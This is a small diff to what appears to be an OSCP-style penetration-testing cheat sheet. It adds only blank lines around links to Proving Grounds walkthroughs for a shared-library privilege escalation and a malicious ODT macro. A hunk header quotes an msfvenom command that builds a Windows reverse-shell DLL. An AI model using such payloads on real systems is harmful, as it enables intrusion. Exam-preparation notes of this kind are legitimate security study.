@@ -101,7 +101,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 #### ➤ .SO
 
 reference : 
+
 https://routezero.security/2025/02/19/proving-grounds-practice-dev_working-walkthrough/
+
 https://medium.com/@carlosbudiman/oscp-proving-grounds-dev-working-intermediate-linux-cd59f01b42c9
 
 Code example 01 (lib_backup.c): LPE
@@ -170,7 +172,9 @@ Once SUID activated, only perform :
 #### ➤ Macro .ODT
 
 How to create a malicious .ODT macro : 
+
 https://www.savagehack.com/blog/craft-walkthrough-proving-grounds-offsec
+
 https://medium.com/@ardian.danny/oscp-practice-series-59-proving-grounds-craft-4b86a013924d
 
 
